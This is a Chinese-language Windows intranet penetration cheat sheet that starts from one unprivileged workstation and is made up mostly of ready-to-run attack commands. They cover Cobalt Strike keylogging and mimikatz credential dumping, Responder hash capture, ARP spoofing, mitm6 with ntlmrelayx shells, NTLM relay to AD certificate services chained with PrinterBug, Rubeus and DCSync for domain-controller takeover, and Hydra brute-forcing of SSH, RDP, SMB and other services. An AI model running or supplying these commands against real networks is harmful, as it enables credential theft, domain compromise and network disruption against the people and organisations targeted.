# windows 无权限渗透
开局一台个人机
# 信息收集
## 1. 内网扫描
```
nmap
nmap -sP -p <ip> #ping 扫描
nmap -PN -sV --top-ports 50 --open <IP> #快速扫描
nmap -PN  --script smb-vuln* -p139,445 <IP> #扫描 smb 漏洞
nmap -PN -sC -sV <ip>#经典扫描
nmap -PN -sC -sV -p <ip>#全扫描
nmap -sU -sC -sV <ip>#udp扫描
cs
portscan [targets] [ports] [arp|icmp|none] [max connections]
```
## 2. 个人机信息收集
```
cobaltstrike + seatbelt (利用seatbelt 遍历 有趣的文件)
execute-assembly /path/seatbelt.exe InterestingFiles  有趣文件
execute-assembly /path/seatbelt.exe InstalledProducts 安装程序
execute-assembly /path/seatbelt.exe InterestingProcesses  进程

详情:https://github.com/GhostPack/Seatbelt
因为Seatbelt是.NET程序所以可以用execute-assembly直接注入目标内存运行
```
## 3.浏览器保存的密码和浏览记录
## 4.个人机的账号密码
```
cs 的mimikztz 
logonpasswords            Dump credentials and hashes with mimikatz
```
## 5.键盘记录
```
cs 的键盘记录
keylogger                 Inject a keystroke logger into a process
```
## 6.该机器的社交软件

# 中间人攻击
## 1.responder
```
https://github.com/lgandx/Responder-Windows  编译好的windows 版本
responder.exe -wrf -i ip   抓NTLM HASH 然后破解
```
## 2.ARP
```
https://github.com/ivanvza/arpy
arpy -t <Target IP> -g <Gateway IP> -i <Interface>
伪装网关,截取目标机流量 再用windump 抓取流量 #慎用容易照成目标网络奔溃
```
## 3.mitm6
利用IPv6和DNS将凭证中继到目标。在默认情况下，IPv6协议是处于启用状态的，并且实际上其优先级会大于IPv4协议，这意味着，如果计算机上有IPv6 DNS服务器的话，它会优先使用IPv6服务器，而不是IPv4服务器。另外，默认情况下，Windows计算机会通过DHCPv6请求来查找IPv6 DNS服务器，如果使用伪造的IPv6 DNS服务器进行欺骗，则可以有效地控制设备查询DNS的方式
```
1.伪造dns服务器
mitm6 -i eth0 -d<domain>

2.伪造WPAD应答来控制了DNS
ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
-wh：托管WPAD文件的服务器（攻击者的IP）
-t：目标系统
-i：打开一个交互式shell
```
## 4.NTLM Relay攻击ADCS证书服务
```
1.定位ca服务器
certutil -config - -ping

2.测试连通性
curl http://CA_server_ip/certsrv -I

3.impacket设置监听
impacket-ntlmrelayx -debug -smb2support --target http://CA_server_ip/certsrv/certfnsh.asp --adcs --template DomainControlle

4.打印机bug,让域控回连到我们监听的服务上
SpoolSample.exe dcip attackip
python3 printerbug.py domain/user:password@dcip attackip

5.从 3 中获得证书

6.使用Rubeus.exe获取tgt
Rubeus.exe asktgt /outfile:kirbi /user:dc01$ /ptt /certificate:获取的证书

7.mimikatz导hash
lsadump::dcsync /all /csv /domain:xxxx
```
# 前辈们的痕迹
```
1.3389 后门
4下shift,其他代替的功能
2.匿名访问共享
smbmap -u "guest" -p "" -P 445 -H <dc-ip>
3.不应该存在的txt
```

# Hydra爆破(慎用容易产生报警)
```
#使用hydra破解ssh的密码
hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh
#破解https：
hydra -m /index.php -l username -P pass.txt IP https
#破解teamspeak：
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
#破解cisco：
hydra -P pass.txt IP cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable
#破解smb：
hydra -l administrator -P pass.txt IP smb
#破解pop3：
hydra -l muts -P pass.txt my.pop3.mail pop3
#破解rdp：
hydra IP rdp -l administrator -P pass.txt -V
#破解http-proxy：
hydra -l admin -P pass.txt http-proxy://10.36.16.18
#破解telnet
hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V

```
# 钓鱼

#后续会补充
